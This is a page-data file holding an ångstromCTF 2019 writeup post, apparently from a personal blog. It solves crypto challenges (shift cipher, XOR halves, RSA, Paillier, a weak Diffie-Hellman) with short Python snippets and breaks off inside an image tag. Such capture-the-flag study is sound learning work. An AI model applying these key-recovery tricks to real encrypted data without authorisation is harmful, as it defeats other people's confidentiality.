{
    "componentChunkName": "component---src-templates-md-blog-post-js",
    "path": "/post/2019-04-23-angstromctf-2019-writeups",
    "result": {"data":{"markdownRemark":{"html":"<ul>\n<li>Writeups\n<ul>\n<li>crypto\n<ul>\n<li>classy-cipher</li>\n<li>really-secure-algorithm</li>\n<li>half-and-half</li>\n<li>runes</li>\n<li>paint</li>\n<li>wall-e</li>\n</ul>\n</li>\n<li>web\n<ul>\n<li>no-sequels</li>\n<li>no-sequels-2</li>\n<li>dom-validator</li>\n</ul>\n</li>\n<li>misc\n<ul>\n<li>paper-trail</li>\n<li>scratch-it-out</li>\n<li>paper-cut</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h1>Crypto</h1>\n<h2>Classy Cipher</h2>\n<h3>Crypto - 20 points (solved)</h3>\n<blockquote>\n<p>Every CTF starts off with a Caesar cipher, but we're more classy.</p>\n<p>Author: defund</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span> shift\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\te <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\t<span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> d<span class=\"token punctuation\">:</span>\n\t\te <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> e\n\n<span class=\"token keyword\">assert</span> encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> shift<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">':&lt;M?TLH8&lt;A:KFBG@V'</span></code></pre></div>\n<hr>\n<h2>Solution</h2>\n<p>The cipher algorithm is essentially a caeser shift cipher. We can write a simple python script that decrypts the ciphertext.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    d <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> e<span class=\"token punctuation\">:</span>\n        d <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> d\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">300</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    f <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span><span class=\"token string\">':&lt;M?TLH8&lt;A:KFBG@V'</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">'actf'</span> <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">></span> python <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>classy_decrypt<span class=\"token punctuation\">.</span>py\nactf<span class=\"token punctuation\">{</span>so_charming<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h1>Half and Half</h1>\n<h2>Crypto - 50 points (solved)</h2>\n<blockquote>\n<p>Mm, coffee. Best served with half and half!</p>\n<p>Author: defund</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">xor</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\to <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\to <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> o\n\n<span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span>\n\nhalf <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">2</span>\nmilk <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>half<span class=\"token punctuation\">]</span>\ncream <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span>half<span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">assert</span> xor<span class=\"token punctuation\">(</span>milk<span class=\"token punctuation\">,</span> cream<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">'\\x15\\x02\\x07\\x12\\x1e\\x100\\x01\\t\\n\\x01\"'</span></code></pre></div>\n<hr>\n<h2>Solution</h2>\n<p>The given script takes the flag, splits it in half and gives us the result of xoring these two halves. The length of this result is 12, so we know the length of the flag should be 24. Since we know the flag is in the format <code>actf{[A-Za-z0-9]}</code> we can get the first 5, 12th to 17th and last characters of the flag.\nIn a python shell:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> xor\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> c <span class=\"token operator\">=</span> <span class=\"token string\">'\\x15\\x02\\x07\\x12\\x1e\\x100\\x01\\t\\n\\x01\"'</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> xor<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'actf{'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token string\">'taste'</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> xor<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'}'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token string\">'_'</span></code></pre></div>\n<p>So we know the flag looks something like <code>actf{??????_taste??????}</code>. Now, to get the rest of the flag, we could try and write a script to bruteforce the remaining 12 characters (6 values), but given that part of the flag uses an English word, we are probably better off using some educated guessing techniques here. We see that an underscore precedes <code>taste</code>, indicating that the 6 characters before the underscore probably form a noun. The word <code>taste</code> doesn't often appear in an English sentence with only 2 or 3 words, so we can probably guess that it should be <code>tastes</code>. xoring <code>s</code> with <code>\\x10</code> gives us <code>c</code>, so if we're correct about this guess, then the first part of the flag text starts with <code>c</code>. So the first part of the flag text is a 6 letter noun that starts with <code>c</code>. If we look at the challenge description, we see a word that happens to fit that description and also makes sense being used before the word <code>tastes</code>! To confirm our suspicions:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">>></span><span class=\"token operator\">></span> xor<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'actf{coffee_'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token string\">'tastes_good}'</span></code></pre></div>\n<p>Our flag is <code>actf{coffee_tastes_good}</code></p>\n<hr>\n<h2>Really Secure Algorithm</h2>\n<h3>Crypto - 30 points (solved)</h3>\n<blockquote>\n<p>I found this flag somewhere when I was taking a walk, but it seems to have been encrypted with this Really Secure Algorithm!</p>\n<p>Author: lamchcl</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">p <span class=\"token operator\">=</span> <span class=\"token number\">8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889</span>\nq <span class=\"token operator\">=</span> <span class=\"token number\">7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493</span>\ne <span class=\"token operator\">=</span> <span class=\"token number\">65537</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349</span></code></pre></div>\n<hr>\n<h2>Solution</h2>\n<p>This is a standard RSA problem. We are given the two primes <code>p</code> and <code>q</code>, the public exponent <code>e</code> and the ciphertext <code>c</code>.</p>\n<p>Pop up open a python shell:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">></span> p <span class=\"token operator\">=</span> <span class=\"token number\">8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889</span>\n<span class=\"token operator\">></span> q <span class=\"token operator\">=</span> <span class=\"token number\">7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493</span>\n<span class=\"token operator\">></span> e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span>\n<span class=\"token operator\">></span> c <span class=\"token operator\">=</span> <span class=\"token number\">7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349</span>\n<span class=\"token operator\">></span> <span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> invert\n<span class=\"token operator\">></span> <span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes\n<span class=\"token operator\">></span> phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">></span> d <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">></span> message <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">></span> long_to_bytes<span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token string\">'actf{really_securent_algorithm}'</span></code></pre></div>\n<hr>\n<h2>Runes</h2>\n<h3>Crypto - 70 points (solved)</h3>\n<blockquote>\n<p>The year is 20XX. ångstromCTF only has pwn challenges, and the winner is solely determined by who can establish a socket connection first. In the data remnants of an ancient hard disk, we've recovered a string of letters and digits. The only clue is the etching on the disk's surface: Paillier.</p>\n<p>Author: defund</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">n<span class=\"token punctuation\">:</span> <span class=\"token number\">99157116611790833573985267443453374677300242114595736901854871276546481648883</span>\ng<span class=\"token punctuation\">:</span> <span class=\"token number\">99157116611790833573985267443453374677300242114595736901854871276546481648884</span>\nc<span class=\"token punctuation\">:</span> <span class=\"token number\">2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869</span></code></pre></div>\n<hr>\n<h2>Solution</h2>\n<p>The txt file given gives us three numbers, <code>n</code>, <code>g</code> and <code>c</code>. The clue given is Paillier, which turns out to be a cryptosystem after searching it up on <a href=\"https://en.wikipedia.org/wiki/Paillier_cryptosystem\">wikipedia</a>.\nFrom wikipedia:</p>\n<span class=\"gatsby-resp-image-wrapper\" style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \">\n      <a class=\"gatsby-resp-image-link\" href=\"/static/a6a031d865e0a0cdc74448e7118b3e87/e6c84/paillier-wikipedia.png\" style=\"display: block\" target=\"_blank\" rel=\"noopener\">\n    <span class=\"gatsby-resp-image-background-image\" style=\"padding-bottom: 58.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABiElEQVQoz41T2W6EMAzk/79xH7pVGyDlyEVOyFR2oN22+9BII2MTJjOx6e73F7wLAaUtUkqoteI4aov1O17Pj3hW66ZpwoeUMNYh723Tvu8/cRwcS9mRc0YphdFq5UfezdOE2+2G++sb7u8SclIwRkMpjXVZsCwLR7UuiDHCWQPvPbsh8uAD59u2ceyccxiGAX3foxcC4zBgnmdY52CthTEG2jhol7DFHSEdyLkgeM8EdEhOCdfqqEgfErE2hp+11ryRbOSckFJGykTWEIkwRt4TY0LKp22yHEPAOI4MUkl3eoGUKqUQQoAnxB0uFFbqY24qQ+Q6Wd7I8rqubFkIwSCSpix/NeA4jhM7aj0YLa+oZ51ytnwpmaaZO+351NBU+a2dvG1wZ4yn1asJV0MIRNqRzVF+YPPxq3OXMhoDni/8f3GXiZRsSyl5TCinq7DWcZdJEZ1enwzyn8GmZkg58eWW0pQRAb18XM/y32CF1EUheoyj5D+GVK5K8b26cxbJ+iPJ73XVSOEnpyGlT9Vc6ZsAAAAASUVORK5CYII='); background-size: cover; display: block;\"></span>\n  <img class=\"gatsby-resp-image-image\" alt=\"paillier wikipedia\" title=\"paillier wikipedia\" src=\"/static/a6a031d865e0a0cdc74448e7118b3e87/0a47e/paillier-wikipedia.png\" srcset=\"/static/a6a031d865e0a0cdc74448e7118b3e87/8a4e8/paillier-wikipedia.png 150w,\n/static/a6a031d865e0a0cdc74448e7118b3e87/5a46d/paillier-wikipedia.png 300w,\n/static/a6a031d865e0a0cdc74448e7118b3e87/0a47e/paillier-wikipedia.png 600w,\n/static/a6a031d865e0a0cdc74448e7118b3e87/1cfc2/paillier-wikipedia.png 900w,\n/static/a6a031d865e0a0cdc74448e7118b3e87/e6c84/paillier-wikipedia.png 1148w\" sizes=\"(max-width: 600px) 100vw, 600px\" style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\" loading=\"lazy\" decoding=\"async\">\n  </a>\n    </span>\n<p>We require the private key (lambda, myu) to decrypt the ciphertext. <code>n</code> looks quite small, so we chuck it into factordb and find its two factors <code>310013024566643256138761337388255591613</code> and <code>319848228152346890121384041219876391791</code>.\nOpen up a Python shell and proceed to decrypt the ciphertext:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">>></span><span class=\"token operator\">></span> p <span class=\"token operator\">=</span> <span class=\"token number\">310013024566643256138761337388255591613</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> q <span class=\"token operator\">=</span> <span class=\"token number\">319848228152346890121384041219876391791</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> g <span class=\"token operator\">=</span> n<span class=\"token operator\">+</span><span class=\"token number\">1</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> c <span class=\"token operator\">=</span> <span class=\"token number\">2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> lam <span class=\"token operator\">=</span> phi\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> invert\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> myu <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>phi<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> L <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> m <span class=\"token operator\">=</span> L<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> lam<span class=\"token punctuation\">,</span> n<span class=\"token operator\">*</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>myu <span class=\"token operator\">%</span> n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token string\">'actf{crypto_lives}'</span></code></pre></div>\n<hr>\n<h2>Paint</h2>\n<h3>Crypto - 100 points (solved)</h3>\n<blockquote>\n<p>This amazing new paint protocol lets artists share secret paintings with each other! Good thing U.S. Patent 4200770 is expired.</p>\n<p>Author: defund</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> binascii\n<span class=\"token keyword\">import</span> random\n\n<span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag\n\nimage <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>binascii<span class=\"token punctuation\">.</span>hexlify<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\npalette <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2048</span>\nbase <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> palette<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token number\">1</span>\nsecret <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> palette<span class=\"token punctuation\">)</span>\nmy_mix <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> palette<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'palette: {}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>palette<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'base: {}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'my mix: {}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>my_mix<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nyour_mix <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'your mix: '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nshared_mix <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>your_mix<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> palette<span class=\"token punctuation\">)</span>\npainting <span class=\"token operator\">=</span> image <span class=\"token operator\">^</span> shared_mix\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'painting: {}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>painting<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">palette<span class=\"token punctuation\">:</span> <span class=\"token number\">32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891541065808607552399123930385521914333389668342420684974786564569494856176035326322058077805659331026192708460314150258592864177116725943603718461857357598351152301645904403697613233287231227125684710820209725157101726931323469678542580656697935045997268352998638215525166389437335543602135433229604645318478604952148193555853611059596230656</span>\nbase<span class=\"token punctuation\">:</span> <span class=\"token number\">13489305024865487703110255658234329747698118206959778644688156332043783846078839120693894255527894489531905012244713117142764166452312133019772171674466933769775907460046497284522592167536594047800489828714315435570429416637425443402332599055774982796405757075108551322778712959943658831605397635195107786224617525627358659165255604556424206194207190437525742567525338826878962081515333896433312311548844614323540250054093970082337500580573165008440265840792908334486258260848163001490152587781983042546491301026074736907693887630347258892882871059741621049169714319440564952700454580681894452760215968494428411686329</span>\nmy mix<span class=\"token punctuation\">:</span> <span class=\"token number\">6870295205307030503255600311283969014496436297715066273709495591567561187646528069669895230912327862244474990612611625088862250315706633708998214109152824455738719595737772769297517386968692628228327225922261219083693899105983726637012353264168761696183327692619506267951701511870035935612090359086376808592001973358166067468618577312983514388332736591060901174314042634365304017788649960016991442596975922402288221898367955532116456798868804571091463566329706023967280838744359633963847966790121312196824818606244189274966061324393424041211903396020720341163472399763951106703068172772579049891895580785347369093113</span>\nyour mix<span class=\"token punctuation\">:</span> <span class=\"token number\">14317253516668543276504878316838097235650210449758621543536146016892160048656997634541093315774403078357942150970695487937570449270120625898199254439189104072891595263513437420116930684308702803055295267600790477195902538538739117809573391251939794413361184343367694928615752045687223262368136262534778688889202144260002584306527206705616186699377315031757095455954292951059462279988296369935635246644221722025457496936215039008069820514166063271894671978845634968761626636993374291118230179892722513818307254406450607168911057458141649111515924404215975886422961651958216688209696158879621701708955382424640000048217</span>\npainting<span class=\"token punctuation\">:</span> <span class=\"token number\">17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751566466034447988065494130102242572713515917910688574332104680867377750329904425039785453961697828887505197701127086732126907914324992806733394244034438537271953062873710421922341053639880387051921552573241651939698279628619278357238684137922164483956735128373164911380749908774512869223017256152942356111845682044048514917460601214157119487675633689081081818805777951203838578632029105960085810547586385599419736400861419214277678792284994133722491622512615732083564207280344459191773058670866354126043620</span></code></pre></div>\n<hr>\n<h2>Solution</h2>\n<p>The given script chooses some random big numbers and creates some <code>shared_mix</code> from them and xors this with the flag. If we can find <code>shared_mix</code>, we can simply xor this with the <code>painting</code> and retrieve the flag. <code>shared_mix</code> is equal to <code>(your_mix ^ secret) mod palette</code> of which we know <code>your_mix</code> and <code>palette</code>, so the task becomes determining <code>secret</code>.</p>\n<p>The challenge description mentions US Patent 4200770, which is the Diffie-Hellman key exchange system. This is a fairly common method so we could have figured that out just by looking at the script. Anyway, we learn from the <a href=\"https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange\">wikipedia page</a> that Diffie-Hellman works by the two parties agreeing on a public modulus <code>p = palette</code> and base <code>g = base</code>. Each party then chooses their own secret values which they don't transmit. Using their own secret values, they can securely create a key together. In the context of the challenge, <code>shared_mix</code> is this key. <code>your_mix</code> is given to us but we don't know the corresponding secret, so we can't simply figure out <code>shared_mix</code> from it.</p>\n<p>The problem we are trying to solve is the <a href=\"https://en.wikipedia.org/wiki/Discrete_logarithm\">discrete log problem</a>. Normally this would be quite difficult, but on further inspection of the given script, we notice something that will make solving this problem much easier. In particular, <code>palette = 1 &#x3C;&#x3C; 2048</code>. In other words, <code>palette = 2^2048</code>.\nLooking around on wikipedia again for ways to solve the discrete log problem, we come across the <a href=\"https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm\">Pohlig-Hellman algorithm</a>.</p>\n<span class=\"gatsby-resp-image-wrapper\" style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \">\n      <a class=\"gatsby-resp-image-link\" href=\"/static/cba7d08bf346b6e9ce34a0e384a14a8c/1dbe8/pohlig-wikipedia.png\" style=\"display: block\" target=\"_blank\" rel=\"noopener\">\n    <span class=\"gatsby-resp-image-background-image\" style=\"padding-bottom: 31.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA0klEQVQY03WQCW6FMAxEuf814SeQQBbIHsRUdtWWv9TSiyUrY489aL1imVcIsUCvG5zzsNbCGot93xFCQIzxKb/yV48YlNIYR4nHY4aUElIKTOMIIQS2bYMxhqEhP2ImRJRSQHFd1y9DrRXWGhazo5ixHwkpJeScWXSeJ3MXEp9ioCfFhGmaoJTCvGisxsN5/9S0tfbW8NMAbkiraK0Z7x1yTqi1oNWK3ht67/86ugevTCLnvu9Djug+R0gIseCIGSkVdkmnIZf0v96gWuXBnR1+AUfu0bmBS24KAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"></span>\n  <img class=\"gatsby-resp-image-image\" alt=\"pohlig wikipedia\" title=\"pohlig wikipedia\" src=\"/static/cba7d08bf346b6e9ce34a0e384a14a8c/0a47e/pohlig-wikipedia.png\" srcset=\"/static/cba7d08bf346b6e9ce34a0e384a14a8c/8a4e8/pohlig-wikipedia.png 150w,\n/static/cba7d08bf346b6e9ce34a0e384a14a8c/5a46d/pohlig-wikipedia.png 300w,\n/static/cba7d08bf346b6e9ce34a0e384a14a8c/0a47e/pohlig-wikipedia.png 600w,\n/static/cba7d08bf346b6e9ce34a0e384a14a8c/1cfc2/pohlig-wikipedia.png 900w,\n/static/cba7d08bf346b6e9ce34a0e384a14a8c/c1b63/pohlig-wikipedia.png 1200w,\n/static/cba7d08bf346b6e9ce34a0e384a14a8c/1dbe8/pohlig-wikipedia.png 1374w\" sizes=\"(max-width: 600px) 100vw, 600px\" 